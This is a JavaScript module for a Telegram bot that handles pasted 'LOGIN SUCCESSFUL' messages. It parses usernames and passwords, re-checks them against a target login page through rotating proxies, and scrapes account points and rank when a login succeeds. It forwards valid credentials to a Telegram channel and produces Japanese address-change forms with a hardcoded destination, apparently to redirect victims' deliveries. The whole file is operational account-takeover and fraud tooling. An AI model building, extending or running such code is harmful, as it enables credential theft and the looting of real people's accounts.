/**
 * =============================================================================
 * FORWARD ACTION HANDLER - Actions for forwarded success messages
 * =============================================================================
 *
 * When a user forwards (or copy-pastes) a "LOGIN SUCCESSFUL" message back to
 * the bot, this module:
 *
 *   1. Detects the message by content (contains "LOGIN SUCCESSFUL")
 *   2. Parses credentials, name, and optional tracking code from the text
 *   3. Presents two inline buttons: RECHECK and ADDRESS FILL OUT
 *      - RECHECK: re-runs the credential check (same flow as .chk)
 *      - ADDRESS FILL OUT: generates a Japanese address-change form with
 *        a random reason, the account's name, and a hardcoded destination
 *
 * State is kept in an in-memory MapWithTtl (5-minute TTL).  The coordinator
 * owns the Telegram bot, so no cross-process storage is needed.
 *
 * =============================================================================
 */

const crypto = require('crypto');
const fs = require('fs').promises;
const { Markup } = require('telegraf');

const { checkCredentials } = require('../shared/http/checker');
const { closeSession } = require('../shared/http/sessionManager');
const { captureAccountData } = require('../shared/capture');
const { forwardValidToChannel, handleCredentialStatusChange } = require('./channelForwarder');
const { getConfigService } = require('../shared/config/configService');
const { createMapWithTtl } = require('../shared/utils/mapWithTtl');
const { createLogger } = require('../shared/logger');

const {
  escapeV2,
  buildCheckQueued,
  buildCheckProgress,
  buildCheckResult,
  buildCheckAndCaptureResult,
  buildCheckError,
} = require('./messages');
const {
  parseForwardedSuccessMessage,
  buildForwardActionPrompt,
  buildAddressChangeForm,
} = require('./messages/forwardActionMessages');

const log = createLogger('forward-action');

// In-memory store for forwarded message data (5-minute TTL)
const actionStore = createMapWithTtl({ defaultTtlMs: 300000 });

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Generate a short unique action ID for callback_data.
 * @returns {string} 13-char hex ID (e.g. "f1a2b3c4d5e6")
 */
function generateActionId() {
  return 'f' + crypto.randomBytes(6).toString('hex');
}

/**
 * Build runtime config from config service or options fallback.
 * Mirrors the getRuntimeConfig closure in telegramHandler.js.
 * @param {Object} options - Handler options
 * @returns {{timeoutMs:number, proxy:string|null, targetUrl:string}}
 */
function getRuntimeConfig(options) {
  const configService = getConfigService();
  const useConfig = configService.isInitialized();
  return {
    timeoutMs: useConfig ? configService.get('TIMEOUT_MS') : (options.timeoutMs || 60000),
    proxy: useConfig ? (configService.get('PROXY_SERVER') || null) : (options.proxy || null),
    targetUrl: useConfig ? configService.get('TARGET_LOGIN_URL') : (options.targetUrl || process.env.TARGET_LOGIN_URL),
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Registration
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Register forwarded-message detection and action callback handlers.
 *
 * @param {Telegraf} bot - Telegraf bot instance
 * @param {Object} options - { coordinator, timeoutMs, proxy, targetUrl, headless, screenshotOn }
 */
function registerForwardActionHandler(bot, options = {}) {
  // Lazy require to avoid circular dependency with telegramHandler.js
  const { maskProxyUrl } = require('./telegramHandler');

  // ── Detect forwarded success messages ──────────────────────────────────
  bot.on('text', async (ctx, next) => {
    const text = ctx.message?.text;
    if (!text) return next();

    // Skip commands to avoid interfering with .chk, /start, etc.
    if (text.startsWith('.') || text.startsWith('/')) return next();

    // Must contain LOGIN SUCCESSFUL to qualify
    if (!text.includes('LOGIN SUCCESSFUL')) return next();

    // Parse the forwarded message
    const parsed = parseForwardedSuccessMessage(text);
    if (!parsed) {
      log.debug('Text contained LOGIN SUCCESSFUL but parsing failed');
      return next();
    }

    log.info(`[fwd-action] detected credential: ${parsed.username.slice(0, 5)}*** name=${parsed.name || 'n/a'}`);

    // Store parsed data with a short TTL
    const actionId = generateActionId();
    actionStore.set(actionId, parsed);

    // Reply with prompt + buttons
    const promptText = buildForwardActionPrompt(parsed);
    await ctx.reply(promptText, {
      parse_mode: 'MarkdownV2',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 RECHECK', `fwd_recheck_${actionId}`)],
        [Markup.button.callback('📮 ADDRESS FILL OUT', `fwd_addrfill_${actionId}`)],
      ]),
    });

    // Don't call next() — we handled this message
  });

  // ── RECHECK: re-run the credential check ───────────────────────────────
  bot.action(/fwd_recheck_(.+)/, async (ctx) => {
    // Answer callback immediately (must complete within 10s)
    try {
      await ctx.answerCbQuery('Running recheck...');
    } catch (err) {
      log.warn(`answerCbQuery failed (fwd_recheck): ${err.message}`);
    }

    const actionId = ctx.match[1];

    // Defer long work to avoid Telegraf timeout
    setTimeout(async () => {
      try {
        const data = actionStore.get(actionId);
        if (!data) {
          await ctx.reply(
            escapeV2('⚠️ Session expired. Please forward the message again.'),
            { parse_mode: 'MarkdownV2' }
          );
          return;
        }

        // Refresh TTL — the check can take 60-120s
        actionStore.touch(actionId);

        const { username, password } = data;

        // Validate credentials before starting the check
        if (!password) {
          await ctx.reply(
            escapeV2('⚠️ No password found in the forwarded message. Cannot recheck.'),
            { parse_mode: 'MarkdownV2' }
          );
          return;
        }

        const startedAt = Date.now();
        const chatId = ctx.chat?.id;
        if (!chatId) {
          log.debug('[fwd-recheck] no chatId in context');
          return;
        }

        log.info(`[fwd-recheck] start ${username.slice(0, 5)}***`);

        // Send initial status message (will be edited as check progresses)
        const statusMsg = await ctx.reply(buildCheckQueued(), { parse_mode: 'MarkdownV2' });

        const updateStatus = async (text) => {
          try {
            await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, text, {
              parse_mode: 'MarkdownV2',
            });
          } catch (err) {
            log.warn('Status edit failed:', err.message);
          }
        };

        let sessionToClose = null;
        try {
          const runtimeConfig = getRuntimeConfig(options);
          const coordinator = options.coordinator;

          // ── Proxy pool assignment ───────────────────────────────────────
          let proxyUrl = runtimeConfig.proxy;
          let proxyId = null;
          if (coordinator?.proxyPool) {
            const assignment = await coordinator.proxyPool.assignProxy(`fwd-recheck-${Date.now()}`);
            if (assignment) {
              proxyUrl = assignment.proxyUrl;
              proxyId = assignment.proxyId;
            }
          }

          const processorInfo = {
            name: 'coordinator',
            proxy: proxyUrl ? maskProxyUrl(proxyUrl) : 'direct',
          };

          // ── Check credentials ───────────────────────────────────────────
          const result = await checkCredentials(username, password, {
            timeoutMs: runtimeConfig.timeoutMs,
            proxy: proxyUrl,
            screenshotOn: options.screenshotOn || false,
            targetUrl: runtimeConfig.targetUrl,
            headless: options.headless,
            deferCloseOnValid: true,
            onProgress: async (phase) => {
              await updateStatus(buildCheckProgress(phase));
            },
          });
          sessionToClose = result.session;

          // Record proxy health
          if (proxyId && coordinator?.proxyPool) {
            await coordinator.proxyPool.recordProxyResult(proxyId, result.status === 'VALID');
          }

          // ── Show result ─────────────────────────────────────────────────
          const durationMs = Date.now() - startedAt;
          log.info(`[fwd-recheck] finish status=${result.status} time=${durationMs}ms`);

          await updateStatus(
            buildCheckResult(result, username, durationMs, password, result.ipAddress, processorInfo)
          );

          // Clean up screenshot if present
          if (result.screenshot) {
            await fs.unlink(result.screenshot).catch(() => {});
          }

          // If credential was forwarded before, delete/update channel copy
          if (result.status === 'INVALID' || result.status === 'BLOCKED') {
            await handleCredentialStatusChange(ctx.telegram, username, password, result.status);
          }

          // ── Capture if VALID ────────────────────────────────────────────
          if (result.status === 'VALID' && result.session) {
            try {
              await updateStatus(buildCheckProgress('capture'));
              const capture = await captureAccountData(result.session, {
                timeoutMs: options.timeoutMs || 60000,
              });
              const finalMessage = buildCheckAndCaptureResult(
                result, capture, username, durationMs, password, result.ipAddress, processorInfo
              );
              await updateStatus(finalMessage);

              log.info(`[fwd-recheck] captured: points=${capture.points} rank=${capture.rank}`);

              // Forward to channel (if configured)
              await forwardValidToChannel(ctx.telegram, username, password, finalMessage, capture);
            } catch (captureErr) {
              log.warn(`[fwd-recheck] capture failed: ${captureErr.message}`);
              await updateStatus(
                buildCheckResult(result, username, durationMs, password, result.ipAddress, processorInfo)
              );
            } finally {
              closeSession(result.session);
              sessionToClose = null;
            }
          }
        } catch (err) {
          log.error(`[fwd-recheck] error: ${err.message}`);
          try {
            await ctx.telegram.editMessageText(
              chatId, statusMsg.message_id, null, buildCheckError(err.message),
              { parse_mode: 'MarkdownV2' }
            );
          } catch (editErr) {
            await ctx.reply(buildCheckError(err.message), { parse_mode: 'MarkdownV2' });
          }
        } finally {
          if (sessionToClose) {
            closeSession(sessionToClose);
          }
        }
      } catch (outerErr) {
        log.error(`[fwd-recheck] outer error: ${outerErr.message}`);
      }
    }, 0);
  });

  // ── ADDRESS FILL OUT: generate address change form ─────────────────────
  bot.action(/fwd_addrfill_(.+)/, async (ctx) => {
    try {
      await ctx.answerCbQuery('Generating address form...');
    } catch (err) {
      log.warn(`answerCbQuery failed (fwd_addrfill): ${err.message}`);
    }

    const actionId = ctx.match[1];

    try {
      const data = actionStore.get(actionId);
      if (!data) {
        await ctx.reply(
          escapeV2('⚠️ Session expired. Please forward the message again.'),
          { parse_mode: 'MarkdownV2' }
        );
        return;
      }

      // Build and send the address change form (inline code for tap-to-copy)
      const form = buildAddressChangeForm(data.name, data.nameKana);
      await ctx.reply(form, { parse_mode: 'MarkdownV2' });

      log.info(`[fwd-addrfill] generated form for ${data.username.slice(0, 5)}***`);
    } catch (err) {
      log.error(`[fwd-addrfill] error: ${err.message}`);
      await ctx.reply(
        escapeV2('⚠️ Failed to generate address form. Please try again.'),
        { parse_mode: 'MarkdownV2' }
      );
    }
  });

  log.info('Forward action handler registered');
}

module.exports = {
  registerForwardActionHandler,
  generateActionId,
};
